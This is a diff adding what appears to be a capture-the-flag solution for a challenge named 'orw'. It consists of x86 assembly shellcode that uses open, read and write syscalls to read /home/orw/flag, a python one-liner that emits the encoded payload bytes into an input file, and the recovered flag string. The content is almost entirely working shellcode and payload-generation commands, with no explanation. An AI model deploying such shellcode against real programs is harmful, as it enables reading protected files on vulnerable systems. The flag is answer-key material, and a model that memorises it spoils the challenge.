@@ -1,0 +1,32 @@
+jmp shell
+
+shellcode:
+xor eax,eax
+mov al,0x5
+pop ebx
+xor ecx,ecx
+int 0x80
+
+mov ebx,eax
+mov dl,100
+mov al,0x3
+mov ecx,0x804a000
+int 0x80
+
+xor eax,eax
+mov al,0x4
+xor ebx,ebx
+mov bl,0x1
+xor edx,edx
+mov dl,100
+int 0x80
+leave
+ret
+
+shell:
+call shellcode
+.byte 0x00
+
+python -c "print '\xEB\x26\x31\xC0\xB0\x05\x5B\x31\xC9\xCD\x80\x89\xC3\xB2\x64\xB0\x03\xB9\x00\xA0\x04\x08\xCD\x80\x31\xC0\xB0\x04\x31\xDB\xB3\x01\x31\xD2\xB2\x64\xCD\x80\xC9\xC3\xE8\xD5\xFF\xFF\xFF/home/orw/flag\x00' " > in
+
+FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
